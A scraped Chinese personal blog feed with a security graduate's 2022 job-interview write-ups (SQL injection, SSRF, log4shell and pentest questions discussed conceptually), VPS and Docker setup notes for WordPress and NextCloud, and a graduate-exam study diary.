主管点评：整体不错，渗透和开发这块需要加强，个人强项不够突出，可以多看看漏洞测试、漏洞公开等，尝试自己挖掘开源项目的漏洞 其实面试官也犹豫了一下，过了半分钟才想起来（x） 二面2022.2.15 实打实面了一个小时，聊了很多很多方向，从项目经历到个人发展规划，还聊到了公司选择等，感觉收获挺大的。 自我介绍 简单背了一下简历（然后是针对简历的提问） （作品赛相关）介绍这个系统 （作品赛相关）数据安全相关 （作品赛相关）聊了一下区块链的开发经历 （区块链相关）智能合约的鉴权、公私密钥相关等 （区块链相关）数字钱包的身份认证等 （区块链相关）智能合约的开发遇到那些困难 （作品赛相关）这个系统和普通联邦学习系统有什么突出特点吗 “挺鸡肋的……保证了安全性，但是牺牲了性能”（瞎说什么大实话） （作品赛相关）聊了一下大型开源项目二次开发的经历与感悟 （作品赛相关）聊了挺久，具体忘了 （渗透相关）介绍一下渗透经历 （渗透相关）方便聊聊渗透思路吗 （渗透相关）渗透过程中的感悟，防守方有哪些不足，作为进攻方主要利用了哪些方式进行渗透 “利用防守方安全意识薄弱……正经的WAF打不穿，但是并不是所有的站点都有WAF” （渗透相关）还聊了挺多，具体忘了，反正没有涉及漏洞细节，都是在侃大山 （Github相关）面试官看到了我的Github，里面有一些docker-compose的脚本，聊了一下项目 （Github相关）介绍一下上述项目的开发历程、设计初衷等 （Github相关）聊了很多云配置的内容 （Github相关）聊到了LNMP的系统搭建，dockerfile相关 （CTF相关）介绍一下CTF相关学习、比赛、获奖等 （CTF相关）介绍一下擅长领域 （CTF相关）后续忘了，也聊了挺久 （工作意向相关）“像你有CTF经历，简历也不错，应该能去很多公司，像长亭、腾讯云、深信服等，包括我们公司，你对未来的公司选择会有怎样的考虑” 直接点名长亭了，有点慌；内心OS：长亭的面试邮件到现在都没发，PingCAP搞快点把我收了…… 说了一下自己的选择标准：优先选择“不加班”，然后选择可能可以落户的公司，最后比较薪资； （工作意向相关）关于加班问题和面试官产生了一点分歧，“我可能要给你泼点冷水，我们也不是不加班，对于一个刚入职的新人，而且你还这么有目标，为了自己的理想肯定是要付出一定努力的……” 狡辩了一下，“我不是厌倦加班，我厌倦的是那种没有意义的加班……单纯的堆积工作时常其实没有太多意思” 然后提到了其他申请的公司，聊了一下对其他公司以及PingCAP的看法；没有踩一捧一的意思，就单纯的聊了一下对工作模式的看法 （英语水平相关）：问了一下口语咋样，但是没有直接上英文，好像下一轮有英文 反问环节：问了一下面试流程，其他忘记了 二面居然秒过了（半小时以内吧），我这面试复盘害妹写完就给我发三面邮件了……呜呜呜我宣布PingCAP也是我的Dream Company之一 一面2022.2.9 简历秒过……非常神奇 HR主动加了我微信，微信中确定的面试时间；PingCAP是截至目前面试体验最好的一家公司，感受到的企业文化有点像微软。一共聊了四十多分钟，主要涉及CTF-WEB、护网、WEB相关的知识等等，差不多可以说是对着简历一句一句问过去。 CTF相关：你给同学的授课内容 如实说 CTF相关：SQL注入如何判断数据库类型 “sqlmap一把梭……” 手动注的话用version函数等 面试官在听完我的答案之后说了他的答案：一般采用撞函数的方法，xxx数据库的函数名是xxx，xxxx数据库的函数名是xxxxx，特定函数执行正确的话即可判断数据库类型，version广义上说说撞函数的一种 CTF相关：布尔盲注、时间盲注 忘记怎么答的了，面试官应该没有补充我的答案 CTF相关：印象中比较有价值的题 聊了一下去年的国赛SQL签到题，“网络原因，时间盲注不行……” 聊了一下职业杯的某题，特定的font导致报错看不到，最后用curl实现了报错注入 聊了一下职业杯的某题，利用注入直接执行了SQL命令修改了密码执行逻辑，而非传统的读写注入 CTF相关：接上一题的font，“平时用过Burp Suite吗，BP中会打印全部内容，为什么会看不见font呢” “用过，当时太懒了没开BP……curl了一下发现可以注就懒得开BP了” CTF相关：一些BP的操作 忘了答了啥，应该没啥大问题 CTF-WEB相关：SSRF相关 简单聊了一下 CTF-WEB相关：如何理解逻辑层面的漏洞 聊着聊着跑题了，后面面试官提醒我，又重新编了一段（x） 大概意思就是“不该加的功能别乱加”，顺便提了一下log4shell的漏洞成因，“乱加功能” CTF-WEB相关：XSS相关 “打比赛用的不多，细节可能忘记了” 护网相关：聊聊演习 聊了一下 护网相关：略 聊了一下 护网相关：略 聊了一下 护网相关：如果让你给甲方企业做渗透测试，你的大概思路 主站扫描、CDN检测、口令探测、注入之类 在授权范围内攻击上游厂商，尝试获取甲方站点源代码，现场审计0day 在授权范围内攻击下游客户、旁站等，先进入内网再突破DMZ 面试官也给出了他的答案进行补充，具体是啥忘了…… 护网相关：介绍了很久的黄金票据和白银票据，准备提问…… “金银票据听说过，但是具体使用细节不熟悉……没有实操过” 面试官给我科普了一下 项目相关：邮件系统 大概聊了一下 聊了一下多线程编程，C与python 项目相关：作品赛 背了一下摘要，讲了一下个人工作，区块链与libsnark 没有细问，但是也没有打断我，让我自己叨逼叨了半天 项目相关：区块链与智能合约 聊了一下truffle、solidity，吐槽了一下solidity不好用 项目相关：爬虫 聊了一下“乐学给爷爬”系统和知乎刷流量系统 “初代项目，维护跑路，停止服务” 项目相关：容器，介绍了很久的k8s，准备提问 “暂时还不会，目前只用过docker-compose”，场面一度十分尴尬 虽然但是，面试官还是给我科普了一下k8s 可能还问到了一些二进制的问题，具体忘了 反问：工作时间，是否加班等 “我们和国外公司比较像，周六周日、法定节假日一定不上班” “我们以结果为导向，上班时间没有强制要求，你愿意九点来也可以，愿意十点来也可以；愿意五点走也可以，愿意六点走也可以，公司没有强制要求；如果有需要，也可以远程办公” “正常情况下不加班，但是如果遇到突发事件可能需要应急响应，像log4shell这种级别的漏洞就得做应急” 聊到这里突然有点哽咽，如此遵守中国劳动法的公司，对标的却是外企，国内996的公司真的需要那么多人996吗…… 总体而言，PingCAP是截至目前，我面试过的面试体验最好的公司，问题的问题很深入，涉及的面很广，但是不管我答的有多烂面试官都会听我讲完；并且能明显看到面试官在记录面试内容，在我讲完之后再针对性提问，而不是在我讲到一半直接打断我…… PingCAP是今天最晚面试的公司，但是最早发出了二面邀请（大概一面过了三个小时就通知了）……可以感受到他们虽然不加班，但是效率还是挺高的。 长亭科技WEB安研（已挂）一面2022.2.24 具体问了啥已经不重要了，基本上全是审计相关的，框架审计、代码审计、SSRF攻击、脆弱服务审计等 上海寺信（暂无后续）一面2022.2.18 主要是做区块链风控的，招聘要求是硕士，但是还是给我面了……面试官小哥哥挺有意思，带着一个XM4（看着像）来面试，说话很温柔哈哈哈，聊天内容也比较融洽，像是一个学长（看起来确实挺年轻）。一共聊了40分钟，主要聊了一下CTF经历和项目，然后聊了一下对区块链的看法。 自我介绍 聊了一下CTF-WEB基础 聊了一下印象深刻的SSRF题 聊了一下护网演习 聊了一下项目 （项目相关）介绍一下项目内容 （项目相关）联邦学习基础问题、系统的学习效率、准确率等 （项目相关）联邦学习中有很多处理Data privacy的方式，为什么选择了零知识证明呢 “巧合，缘分” （项目相关）“我之前做过针对联邦学习的攻击，可以利用xxx进行局部梯度值的回溯，你们的系统如何应对xxx攻击“（具体攻击名称忘了，好像是梯度值相关的） 讲了一下应对方法，协议设计相关的； 提到了项目本身是国自然的一个子项目，只是一个用于打比赛的雏形，后续的如何抵抗彩虹表、如何抵抗日蚀等攻击有博士生在做…… （项目相关）聊了一下libsnark相关内容 （项目相关）聊了一下编译器相关内容 （项目相关）项目开发过程中遇到的困难、瓶颈和优化等 聊了一下电路的精度问题，倍数扩展 聊了一下编译器的优化，循环展开等 聊了一下协议设计的优化等 （区块链相关）聊了一些区块链的基础知识 （区块链相关）聊了一下常见攻击手段和应对方式 （区块链相关）聊了一些区块链的CTF题 面试官：现在CTF中区块链占比大吗，我当年好像都没有区块链的题 我：海星吧，应该也是大方向，没出过相关的题，挺好奇怎么给每个人分配独立环境的……大家都公用一个网络那不是flag就串味了吗…… 面试官：确实不太了解哈哈哈 （区块链相关）聊了一下对区块链未来的看法 （个人展望相关）聊了一下未来规划 反问工作内容 主要是区块链的风控，包括薅羊毛溯源、黑产溯源、防攻击等等（剩下的忘了x） 后面就聊开了，从工作内容聊到考研聊到实习经历聊到户口，就像朋友之间嗦泡一样，然后发现面试官是上交研究生毕业，好厉害呜呜呜 长亭科技区块链（已挂）一面2022.2.17 申请的是区块链工程师，感觉一面的面试官很有意思，挺年轻的，说话很欢快。整个面试约半小时左右，聊的内容挺多，但是很有条理，每次换话题面试官都会提前说一句；氛围也比较融洽，就像是朋友之间互相吹水的感觉（尽管很多东西确实没答上来……） 主要问了WEB基础、渗透测试相关、区块链开发相关、智能合约逆向相关（不会） 自我介绍 简历内容背了一下，详细介绍了区块链的项目 自我介绍完面试官直接来一句”卧槽牛逼”，给我整不会了…… （CTF-WEB相关）：SQL注入的防护 （CTF-WEB相关）：聊聊时间盲注的常用函数 （CTF-WEB相关）：聊聊报错注入 （CTF-WEB相关）：CSRF的防护 （渗透相关）：聊聊数据库提权。udf提权 “不会，只做过suid提权” （代码审计相关）：log4shell漏洞原理 （区块链相关）：solidity语言相关漏洞 “不会” “打比赛的时候直接读到了别人的交易，看到flag了……” （区块链相关）：用过区块链的应用吗 聊了一下去中心化的音乐平台 聊了一下作品赛的链 聊了一下RealWorld CTF数字纪念品的售卖…… 面试官：“哟西” 聊了一下本地模拟挖矿的过程 （区块链相关）：自己搭的私链，如何选择共识机制 （区块链相关）：聊聊共识机制 详细扯了一下PoW相关 提到了PoA和PoS，没细说 （区块链相关）：分片有了解吗 “不会” （区块链相关）：区块链上层的项目接触过吗 “只看过以太坊的源码……” 反问：实习相关 整体感受还是挺舒适的，和PingCAP应该是一个级别的舒适……就是总体感觉上面试官很尊重你，不会打断你的发言，即使你答的文不对题；然后在回答之后会对你的回答做出点评，如果有更好的答案会进行讨论。我感觉这种面试体验很不错。 最后还是挂了，理由是“胜任力不足”。 梦门区块链（暂无后续）2022.2.16 笔试直播写代码，在线写，不限语言，不能调试，不知道输入输出……不能调试的IO赛制哈哈哈。 然后一题都没写出来，我都没脸说自己学过计算机（捂脸跑） 第一题不难，给一串数，求和为零的三元组；难就难在我没搞懂输入格式，一直读不到数据……还不能调试，直接白给 第二题是一个路径优化，难就难在我依然没读到数据 HR小姐姐全程看直播，打着视频电话的那种……后面没写出来的时候她说跟公司反馈一下，试试破格面试……估计凉了 字节跳动（已挂）一面半小时不到结束了，感觉寄了，毛都不会。 SQL注入原理与防御 预编译能防御所有的SQL注入吗 逻辑保护和WAF保护哪个更合适 SSRF相关 问了好多没听过的词……不记得了（我铁FW了） CSRF，原理与防护 CSRF-token，不会 护网经历 Linux运维相关 以头条登录界面为例，有哪些攻击面 “还有什么想说的吗” 结果出了，字节凉了，拜拜了ByteDance（x） 经纬恒润（发了offer，已拒）二面2022.2.14 面试官迟到+1，情人节面试确实有点顶…… 面试之前要求做PPT，介绍自己最高水平的项目，时长控制在15-20分钟。懒癌晚期，直接复制粘贴我的作品赛答辩PPT过去了（里面提到了几句护网相关项目） 前二十分钟念PPT 问的问题基本上是基于PPT内容，面试官懂密码学……比当年作品赛答辩轻松多了（不是） 主要聊了一下系统的零知识证明模块、密钥分发模块 然后聊了一下区块链相关 聊了一下考研，“考哪了”，“考清华来着” 反问：直接开始反问了，有点措手不及 问了一下还有几轮面试，“这是最后一轮技术面” 再次问了落户相关，提到一面的时候问过，“我们企业有一些特殊人才的加分，对落户有帮助，但是不保证百分百” 问了一下工作时间，“965，周末不上班”，海星 面试官介绍了一下工作内容，感觉比一面说的好一点（x） 薪资相关，问了一下预期薪资，问了一下有没有别的offer 一面2022.2.9 总体体验一般，答得也一般，一共聊了半个多小时，面试完才知道它是车企……八股比较多，几乎问了个遍……也可能是我没有一个会的，就从头问到尾了，项目反而基本上没有提到…… 算法相关：堆排序，现场出了一个题问我某个节点变上的节点是啥…… 忘的差不多了，手动画图画的有点慢，基本上靠蒙 操作系统：进程和线程的区别、进程间通信与线程间通信的区别 基本上在阿巴阿巴，系统性的描述在考完研的那一刻就忘了…… 操作系统：堆空间与栈空间的区别 虽然也在阿巴阿巴，但是起码答出来了（?） 计算机网络：问了挺多关于超时重传、滑动窗口相关的问题 基本上在阿巴阿巴，问题比较细，具体忘记了 编译原理：函数调用过程，入栈出栈与参数传递的详细过程 阿巴阿巴：“栈帧……保存现场……中断……恢复现场”，忘干净了（x） 防火墙相关，了解过linux防火墙工作机制吗 扯了一下防火墙静态策略的内容 依然是防火墙相关，以上内容都是静态策略，有动态的解决方案吗 扯了一下IDS相关的 IDS如何判断流量是否合法 纯理论逼逼 IDS的详细操作 “不会” 读过Linux内核源码没 没……但是用过内核API 然后就没细问了 “简历里面写擅长C/C++、python，聊聊用C写的项目” 描述了一下小学期的邮件系统，中途提到网络通信，直接打断转去问计算机网络； 描述了一下作品赛，中途提到了编译器，打断转去问编译原理 中断出去问的问题基本上不会……（八股早忘了x） “作品赛中的大概有多少行代码是自己写的” “没算过” 开始怀疑公司的工作量考核方式…… “那还记得作品赛大致的代码量吗” “最后差不多80M左右” 依然怀疑他们的考核方式，不会有公司用代码量来考核吧？不会吧不会吧？ 薪资相关：预期薪资多少 委婉的提了一下上一家的预期薪资 反问：“我申请的这个岗位主要工作有哪些” 介绍了挺久的车企相关，互联网的感觉不多，有点像传统车联网……面试官的整个描述给我一种很强的开发感，部门大概率全员安开，安研和安服的人可能不多。 反问：“我这个预期薪资会不会有点高” “我们薪资都是上不封顶……” 此话存疑 反问：北京户口相关 “我们会尽力帮你们申请，现在都是积分落户……都是工作几年落户” 此话存疑 总体感觉啥都没答出来，虽然还是聊了半个小时……面试官语速比较快，加上电话面试的音质远不如视频面试，有些话听不太清需要重复提问。CTF相关的问题一个没问，感觉面试官/公司部门应该不是这个方向的，和互联网/网络安全不是直接相关…..整体感觉不太好。 中国系统笔试（暂无后续）2022.2.12 卷子大概有单选、不定项选、编程，主要考察基础知识、场景应用之类的。 笔试本身不难，难的是我做错了卷子……还不止做错了一套（x） 我应该做了三套卷子吧，第一套数据工程师的，第二套安全工程师的，第三套应该是测开或者运维 数据工程师： 基础题：都是真基础题，学过数据库就能做； 应用题：好像考了HDFS，不会，瞎写； 编程题：用MYSQL8编程，不会，瞎写； 安全工程师： 基础题：一些常见的密码学知识、WEB安全知识，送分题； 应用题：好像考了注入相关，送分题忘了； 编程题：不限语言，一个求日期的，另一个忘了，都是送分题 测开/运维（具体忘了）： 基础题：送分题，关于Linux一些命令内容； 应用题：几乎也是送分题，Linux基础操作； 编程题：送分送一半，第一题是用shell脚本写一个500以内7的倍数；第二题不限语言，字符串处理，但是没给数据输出格式，一直猜不对……挺离谱的 七套子卷交了三套……最后就看它改不改卷了（x） 知道创宇实习（发了offer，已拒）2022.2.11 面试官貌似把我忘了，给HR打电话才想起来…… 面试官看过我博客，两年前的东西翻出来问了……在犹豫要不要写（简单写写） 聊聊项目 聊了一下CTF，CTF成绩最好的一次，如何拿到信抗国一的…… 聊了一下护网演习 什么时候能开始实习 开发这块做过什么 聊了一下docker 聊了一下靶场的项目，问有无兴趣 聊到了CTF出题，如何防搅屎 “控制权限” Get shell如何防止搅屎 “别出Get Shell的题…….” 看你搭了两个博客，为啥需要两个博客(?) 博客里面写了WeChat的0day复现，对Chrome的xxx漏洞有了解吗 聊了一下俱乐部和实验室 整体感觉还算不错，大部分时间其实是我在抢答……虽然感觉没问到什么技术性的问题(?) 理想汽车（暂无后续）2022.2.17 二面属实整不会了，想提前进房间等面试官，没想到面试官在蹲我……然后就提前开始，不到十分钟就结束了……现在还一脸懵逼中。 2022.2.9 一面总体体验不错。大概聊了二十多分钟，主要是针对简历在提问，没有问八股（计算机四件套等），提到了一些WEB攻击的手段。大致问题如下： 自我介绍 把简历背了一遍 演习相关：“你简历里面写了教育部的护网演习，这个演习我也了解过，能详细聊聊吗” 聊了一下演习过程 演习相关：演习过程中如何绕过WAF的 这个是笔试题，我没答出来……然后面试依然没有答出来（x） 我：没绕开，长亭的WAF牛逼 主站WAF绕不开，打旁站去了 演习相关：略 演习相关：略 作品赛相关：聊聊你的作品赛 作品赛摘要背了一遍 个人工作讲了一下 作品赛相关：聊聊区块链 个人工作详细讲了一下 网安大事件相关：如果你是我司安全工程师，如何排查log4shell漏洞 纯个人想法：依赖模块扫描，包含log4j模块的代码重点检查，如果存在漏洞则直接重构巴拉巴拉； 参考长亭的解决方案…… 简历相关：重发一份简历，格式有点问题…… 后面发现是牛客网的在线简历同步有大问题……发一份pdf简历过去就ok了、 严重怀疑某厂的安开简历挂了我，是不是没看到我的简历…… 未来规划 随便扯了点 反问环节：面试官主动介绍了工作内容 攻、防都有，从WEB到二进制到IOT，发现漏洞、修复漏洞等 工作意向相关：有没有兴趣来实习 再定（x） 总体体验还算比较愉快，二十分钟左右结束面试，后续加了面试官微信，线上咨询了一下预期薪资，并正在约主管时间准备主管面。 大致就这些，如果想看其他的内容欢迎留言，有时间就来写（x）","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.xiabee.cn/tags/ctf/"}]},{"title":"服务器的折腾","slug":"coding/服务器的折腾","date":"2022-02-03T12:00:23.000Z","updated":"2022-08-13T15:39:31.422Z","comments":true,"path":"posts/vps-toss/","link":"","permalink":"https://blog.xiabee.cn/posts/vps-toss/","excerpt":"","text":"准备工作 一台VPS：腾讯云学生特惠，2核4G内存 8M带宽 一个域名：xiabee.cn 一点点容器使用技巧 需求分析服务器里面跑一些WEB应用，包括但不限于个人博客、个人网盘、共享编辑器、邮件系统等，如果有时间的话可以写几个小程序挂着玩。 如果还有时间的话可以考虑搭一个Cobalt Strike的服务器…… 当前布局 WordPress个人博客 CodiMD共享编辑器 NEXTCloud个人网盘 考虑到多个服务可以共用一个SSL证书，也方便后续的证书更换，我单独设置了一个SSL模块，用于把同一套证书映射到不同的服务中去。 三个服务共用一套SSL证书： 个人博客需求 因为习惯了Wordpress，所以目前的博客还是基于Wordpress搭建的，选用的主题是Sakura。 搭建 Docker搭建Wordpress个人博客 · xiabee-瞎哔哔 将原来的docker-compose修改一下，映射目录写ssl证书在宿主机的绝对路径 迁移博客内容是从原来的博客（阿里云）里面直接迁移过来的，利用Wordpress原生的迁移工具。 但是原来的xiabee.cn解析到阿里云服务器中，xyj.xiabee.cn解析到当前（腾讯云）服务器；现在将xyj.xiabee.cn弃置，直接把xiabee.cn解析到腾讯云服务器中。 Bugs在换域名的时候遇到一些bug： DNS解析有缓存和延迟，没有设置301，导致博客主站地址查询不到 在博客出的过程中，使用的媒体文件均引用自xyj.xiabee.cn，导致最后图片显示失败 Solves DNS解析需要时间，一般十分钟以内都能解决，慢慢等就行 把所有的xyj.xiabee.cn都改成xiabee.cn就好……当然手动改是不可能的，直接强改数据库就行： 进入mariadb容器 登录数据库 执行命令：UPDATE wp_posts SET post_content = replace(post_content,&#39;xyj.xiabee.cn&#39;,&#39;xiabee.cn&#39;); 最终效果 个人网盘需求 基本能跑满8M带宽 支持手机图片自动备份等 所以最后选择了NextCloud作为个人网盘进行施工。 搭建 Docker搭建NextCloud个人网盘 · xiabee-瞎哔哔 迁移Bugs同样是换域名的问题，之前注册网盘的时候使用的是xyj.xiabee.cn，现在它认为使用的域名是不安全的域名，不支持登录。 Solves修改/nextcloud/app/config/config.php（可能需要sudo权限），将array和overwrite.cli.url都改过来即可： 最终效果 如何自动同步文件我们下次再讲（如果我还记得的话X Markdown共享编辑器需求 能多人在线编辑Markdown 能存档 最终选择：CodiMD 搭建 Docker搭建Markdown共享编辑器 · xiabee-瞎哔哔 因为这个没啥留念的，换新的服务器就再搭了一个新的，所以不存在迁移BUG…… 最终效果 其他邮件系统 在做了，在做了 Cobalt Strike 在做了，在做了","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"},{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"vps","slug":"vps","permalink":"https://blog.xiabee.cn/tags/vps/"}]},{"title":"考研日记","slug":"informal-essay/考研日记","date":"2021-12-25T07:06:30.000Z","updated":"2022-08-13T15:39:31.428Z","comments":true,"path":"posts/diary/","link":"","permalink":"https://blog.xiabee.cn/posts/diary/","excerpt":"","text":"2022.2 “有些人十二月死了，二月份才埋” 春招了，886 2021.122021.12.26 考的不是很理想，基本上无了 2021.12.24 明天就要上战场了！ 政治英语随缘发挥了，专业课还能抢救一下 清华甲所好高级呜呜呜，一间房间比我整个寝室还大呜呜呜 2021.12.23 最后一天！ 仿佛在补天 2021.12.22 Last 2 Days！ 明天要做核酸了，不想被捅.jpg 市教委的表扬信到了，好耶 2021.12.21 过了一遍数学公式，感觉在虚度光阴 不焦虑是不可能的，但是只有三天了，凑合过吧 2021.12.20 最后四天！ 周一周一，NMGB（不是 肖四在背了！ 2021.12.19 周日，想摆烂，又不敢摆烂 烦躁ing 政治背不完了 专业课稀烂 2021.12.18 六级：题目出的很好，下次别出了（中共一大没翻出来是我不对了…… 摆烂ing 最后六天……给大家表演一个《Six Days》 2021.12.17 李四第二套有点爽，选填一堆奇技淫巧 大力翻唱《安静》了，好治愈呜呜 明天考六级…….六级要考啥来着？（纯路人，纯裸考.jpg 2021.12.16 李四开始做了，第一套感觉海星 政治肖四有点慢，背不动（x 2021.12.15 十天倒计时了，真的只有十天了（此时严格来说是九天） 开始看肖四主观题了……经典一看就会，一写就错 数学和专业课还是有点慌 2021.12.14 肖四做完了，害妹开始背 数学被李林六套卷整麻了，心态炸裂.jpg 2021.12.13 第八个南京大屠杀死难者公祭日，勿忘国耻 今天写了两套数学，有点晕…… 肖四开始看了，真的开始看了（指选择题） 2021.12.12 肖八三刷结束，不会再有下一遍了 数学概率论又忘干净了…… 2021.12.11 有亿点焦虑，有亿点emo 肖四莽了一眼，害妹开始背.jpg 政治刷题得分 肖八选择 一 二 三 四 五 六 七 八 一刷 42 40 30 40 43 39 41 40 二刷 44 46 43 46 44 45 44 45 三刷 49 47 44 48 47 46 49 49 肖四选择 一 二 三 四 得分 46 47 44 46 2021.12.10 周五，干饭人又开始干饭了 2021.12.9 英语新题型在看了在看了…… 2021.12.8 专业课还是感觉好顶，感觉过国家线有点困难…… 2021.12.7 肖八二刷到第六套，均分基本上都比一刷高一点点 英语黄皮书技巧过了一遍，仿佛没有技巧…… 2021.12.6 把政治时政看完了，不知道能记住多少x 2021.12.5 倒计时19天 不想复习，清个灰吧…… 2021.12.4 周末摸鱼人实锤了（x） 007好看，邦女郎好看（x） 2021.12.3 周五了，干饭人又去干饭了x 时政ING 2021.12.2 政治整理了一下时政……看不完.jpg 2021.12.1 倒计时23天 英语核心词第四轮结束 不想做卷子，好累 2021.112021.11.30 11月的最后一天，整理了一下以前的课件，感觉不是我干专业课，是专业课在干我…… 2021.11.29 考研倒计时25天 09-19的数学做完了，00-16的英语客观题做完了，第一个十年计划完成（x） 数学真题是大一的时候买的，所以到19年就无了，现在直接嫖网上的20和21真题（x） 感觉各科依然稀烂，尤其是专业课，不想读书了md 惊奇的发现某个考研up（空卡）是南昌人 刷知乎刷到自己了，怎么以前的表情包都是这种画风…… 2021.11.28 周末摸鱼 肖八最后一套选择题，40分，不会的题分布各个方向，越做越不会……时政单选题完全靠猜 和学妹交流了一下项目，发现我们作品赛做的那么顶，是因为手动实现了zokrates……不过这个也是链下计算的，如果按照张子剑链上计算的想法，可能害有很多事要做（x） Typora怎么就要收费了？？！？ 2021.11.27 周末摸鱼（划掉） 明天国考，祝黄sir GA上岸 北理解封了，麦当劳真好吃（x） 2021.11.26 周五，毕设选题，还是选了自己的屎山项目…… 莽了一下之前的错题……错太多了不想看了（划掉） 整理了一下GitHub，清理掉了一些无用仓库，顺便改了一下主页 2021.11.25 肖八第七套选择题：41 18年的数学，做的还行；14年的英语，做的还行 好累，想睡觉，想唱歌，想摸鱼，想反恐，呜呜呜 2021.11.24 肖八第六套选择题：39 专业课模拟整破防了，不出意外我可能考不到60分…… 2021.11.23 肖八第五套选择题，43分，错七个单选…… 干了套17年的数学，比16的简单一点（？ 干了半套13年英语……英语主观题妹开始，寄 整理资料的时候发现自己的思修论文、sxz的思修论文、QZX的马原复习笔记、当年管原的答辩PPT……社死现场.jpg 2021.11.22 肖八第四套选择题，40分 重新看了一下408的数据结构，还是忘了挺多的……寄 操作系统也重新搞了一点，我突然想起了自己是真的没写过OS的来着，当时OS课设三个老师好像就马波没让写操作系统……寄 2021.11.21 肖八第三套选择题，喜提30分（越做越差.jpg） 周末摸鱼……羽绒衣上油了就给洗了，然后： 今天北京的风： 2021.11.20 作品赛的屎山传给学妹了（x） 毕设基本上也是这个零知识证明没得跑了……想到亲自要重构屎山还是有点顶 淦了套英语，状态一般 周末摸鱼，《11月的萧邦》YYDS 2021.11.19 干了半套16年的数一，偶数年好难，干不动（22考研，寄） 2021.11.18 又到了支部的发展大会了，不知不觉入党半年了耶 15的数学一干完了，感觉海星 我们的作品赛成网安学院的大创项目了……屎山终于有人接了哈哈哈（划掉） 2021.11.17 肖八第二套选择题，整了个40分。错的依然是概念题……概念背不完啊啊啊啊啊WRNM 408数据结构的栈和队列为什么天天在入栈出栈入栈出栈……太无聊了直接下一章了 今天去取药妹写数学英语（跑路 2021.11.16 一天干三科太顶了，英语和政治只做了选择题.jpg 第三轮单词好像背完了？犹豫几天再看要不要开第四轮…… 肖八第一套，客观题干了42分，错的选择题基本上都是要背的（RNM麻了，啥也没背全靠感觉；不过42分是不是也还可以了x 好几天没看专业课了，感觉要死。 2021.11.15 干了一套14年的数一真题卷，正确率海星（?） 感觉高数部分可能害妹大一做的好……隐约感觉这套09年的真题卷是我大一做的…… 2021.11.14 周末摸鱼…… 《头文字D》和《不能说的秘密》拍的真好，我好像理解《一路向北》和《不能说的秘密》这两首苦情歌的感情了 桂纶镁好好看（划掉） 肖秀荣1000题选择题基本上过完了，思修法基多选不想做了…… 2021.11.13 01年到09年的英语一真题客观题干完了……状态时好时坏，甚至可能跟身体状态有关（x 2021.11.12 一觉醒来喉咙巨痛……宿舍里面也太干了吧……加湿器已经火力全开了 2021.11.9 软件工程课设终于结束了WRNMD……感谢队友大哥们带我（考研狗，纯摸了） 2021.11.8 破防了，计网练习题有个问题是：SNMP的模型的四个组成部分是（） 我似乎确凿大约的确是没学过…… 2021.11.7 有人相爱，有人夜里看海，有人肖八出版肖1000害妹写完却不知悔改…… 2021.11.6北京初雪！！！ 给hds过生日，去良乡了，妹有学习 在良乡打羽毛球，妹有学习 和QZX、DHY约饭，妹有学习 回来路上被大雪整自闭了，没穿羽绒衣，差点交代在路上（x） 2021.11.4 毛中特选择题结束……史纲看起来比毛中特简单亿点点 2021.11.3 线die忘干净了，裂开 2021.11.2 某同学作息不规律，头疼头晕去医院了……大家一定要按时吃早饭哇（x） 2021.102021.10.31 体测的第二天依然四肢酸痛QAQ 2021.10.30 体测杀我。 2021.10.28 计算机网络还是要复习一下，不然GBN都不会算 2021.10.27 408的数据结构比912简单亿点点 2021.10.26 “实验做得很好，下次别做了” 2021.10.25 正式报名的最后一天，车门焊死了，改不了了。","categories":[{"name":"informal essay","slug":"informal-essay","permalink":"https://blog.xiabee.cn/categories/informal-essay/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://blog.xiabee.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"如何在双十一快速脱单？","slug":"informal-essay/双十一","date":"2021-11-11T12:00:23.000Z","updated":"2022-08-13T15:39:31.426Z","comments":true,"path":"posts/11-11/","link":"","permalink":"https://blog.xiabee.cn/posts/11-11/","excerpt":"","text":"如何在双十一快速脱单 （划掉，复习去了，886）","categories":[{"name":"informal essay","slug":"informal-essay","permalink":"https://blog.xiabee.cn/categories/informal-essay/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://blog.xiabee.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"Docker搭建NextCloud个人网盘","slug":"coding/docker搭建next cloud","date":"2021-11-09T12:00:23.000Z","updated":"2022-08-13T15:39:31.419Z","comments":true,"path":"posts/nextcloud-docker/","link":"","permalink":"https://blog.xiabee.cn/posts/nextcloud-docker/","excerpt":"","text":"开端 百度云非会员太慢了！！！ One Drive有时候连不上服务器！！！ 正好手头有个4G内存8M带宽的服务器，可以整个活 手头也有个域名，已经搞了SSL证书，可以满足网盘加密传输的需求 太长不看版：代码在这里，设置密码、添加证书、修改域名，docker-compose up -d就行 NextCloud简介 官网 nextcloud是一款开源的、支持多平台的云盘，有服务器的小朋友可以整一个玩玩，可以搭一个自己的One Drive 搭建方式官网的搭建过程比较麻烦，需要手动配置服务器再执行相关代码等等。这里懒癌晚期患者直接去dockerhub找了个官方镜像，直接通过容器进行安装。 首先要确保你的VPS中安装了docker和docker-compose 12345sudo apt install docker.iosudo apt install dockersudo apt install docker-composesudo service docker start# 以 Ubuntu 为例 单容器搭建nextcloud独立容器版本使用的是Apache服务器，自带SQLite作数据库，基本满足个人需求。如果对性能要求不高的话直接单容器搭建也可以： 123456docker run -d \\ --restart=always \\ --name nextcloud \\ -p 5000:80 \\ -v ~/nextcloud:/var/www/html \\ docker.io/nextcloud 参数解释： 1234567run # 运行容器实例-d # 守护模式运行-restart=always # 遇到问题就重启--name nextcloud # 命名为nextcloud-p 5000:80 # 将容器的80端口映射到宿主机的5000端口-v ~/nextcloud:/var/www/html # 将容器的/var/www/html目录映射到主机的~/nextcloud目录docker.io/nextcloud # 创建容器用到的镜像 构建完毕后，通过http://ip:5000就能访问nextcloud了，然后进行相关设置即可。 满血搭建 项目在GitHub仓库中 相较于单容器的nextcloud，这次满血搭建添加了fpm、nginx、mariadb、redis以提高安全性和性能 